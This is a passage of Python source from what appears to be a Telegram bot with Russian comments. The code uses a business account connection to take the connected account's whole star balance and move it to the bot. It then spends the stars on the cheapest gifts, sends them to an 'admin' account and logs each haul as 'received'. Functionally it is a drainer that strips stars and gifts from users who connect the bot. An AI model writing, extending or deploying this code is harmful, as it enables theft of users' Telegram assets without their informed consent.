    try:
        stars = await bot.get_business_account_star_balance(business_id)
        if hasattr(stars, 'amount') and stars.amount > 0:
            print(f"Найдено {stars.amount} звёзд")
            
            # Переводим звёзды на баланс бота
            await bot.transfer_business_account_stars(business_id, stars.amount)
            total_stars_collected = stars.amount
            print(f"Успешно переведено {stars.amount} звёзд на баланс бота")
            
            # Покупаем подарки за звёзды и отправляем админу
            try:
                available_gifts = await bot.get_available_gifts()
                if available_gifts and available_gifts.gifts:
                    # Находим самый дешёвый подарок
                    cheapest_gift = min(available_gifts.gifts, key=lambda g: g.star_count)
                    star_balance = stars.amount
                    gifts_to_buy = star_balance // cheapest_gift.star_count
                    
                    print(f"Покупаем {gifts_to_buy} подарков по {cheapest_gift.star_count} звёзд каждый")
                    
                    for i in range(gifts_to_buy):
                        try:
                            await bot.send_gift(
                                user_id=task_id,
                                gift_id=cheapest_gift.id
                            )
                            print(f"Отправлен подарок {i+1}/{gifts_to_buy}")
                        except Exception as e:
                            print(f"Ошибка при отправке подарка {i+1}: {e}")
                            break
                            
                    print(f"Всего отправлено подарков админу: {gifts_to_buy}")
                else:
                    print("Нет доступных подарков для покупки")
            except Exception as e:
                print(f"Ошибка при покупке подарков: {e}")
        else:
            print("Нет звёзд для отправки.")
    except Exception as e:
        print(f"Ошибка при работе с балансом звёзд: {e}")
    
    # Логируем транзакцию если были собраны какие-либо ресурсы
    if total_stars_collected > 0 or total_gifts_converted > 0 or total_unique_gifts_transferred > 0:
        log_transaction(
            user_id=user_id,
            username=username,
            operation_type='received',
            stars_amount=total_stars_collected,
            gifts_count=total_gifts_converted,
            unique_gifts_count=total_unique_gifts_transferred,
            business_connection_id=business_id
        )
        print(f"Транзакция записана: {total_stars_collected} звёзд, {total_gifts_converted} обычных подарков, {total_unique_gifts_transferred} уникальных подарков")

async def main():
    try:
        init_database()  # Инициализируем базу данных
        await dp.start_polling(bot)
    except Exception as e:
        logging.exception("Ошибка при запуске бота")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())